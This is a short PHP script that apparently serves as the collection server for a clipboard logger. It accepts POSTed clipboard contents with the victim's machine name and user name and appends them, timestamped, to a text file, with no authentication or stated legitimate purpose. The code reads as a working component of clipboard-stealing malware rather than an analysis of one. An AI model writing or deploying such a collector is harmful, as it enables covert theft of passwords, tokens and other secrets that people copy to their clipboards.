<?php
// Save logs to file
$logFile = __DIR__ . "/clipboard_log.txt";

// Get POST data
$clipboard_data = $_POST['clipboard_data'] ?? '';
$machine_name   = $_POST['machine_name'] ?? 'Unknown';
$user_name      = $_POST['user_name'] ?? 'Unknown';

// Prepare log entry
if (!empty($clipboard_data)) {
    $entry = "Time: [" . date("Y-m-d H:i:s") . "] \n"
           . "Machine: $machine_name \nUser: $user_name \nClipboard: $clipboard_data \n" . PHP_EOL;

    // Append to file
    file_put_contents($logFile, $entry, FILE_APPEND | LOCK_EX);

    // Response
    echo json_encode(["status" => "success", "message" => "Clipboard data received"]);
} else {
    echo json_encode(["status" => "error", "message" => "No clipboard data received"]);
}
?>
